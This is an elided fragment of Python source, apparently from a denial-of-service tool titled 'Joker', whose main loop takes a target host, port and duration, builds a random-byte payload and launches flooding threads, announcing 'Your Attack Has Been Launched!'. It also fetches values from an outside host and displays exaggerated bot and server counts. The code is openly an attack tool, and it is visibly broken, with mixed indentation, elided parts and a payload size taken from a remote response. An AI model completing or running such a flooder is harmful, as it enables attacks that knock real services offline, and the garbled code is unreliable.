...
def main():
	...
	while True:
        bots= requests.get('https://api.Mayhem.org').text.strip()
		sys.stdout.write("\x1b]2;Joker. | Devices: [{}] | Spoofed Servers [999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999] | Server Units [99999999999999999999999999999999] | Clients: [99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999]\x07".format (bots))
		...
		if sinput == "cls":
			...
			try:
				if running >= 0:
					...
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
                    ip= requests.get('https://api.Mayhem.org').text.strip()        
					punch = random._urandom(int(ip))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
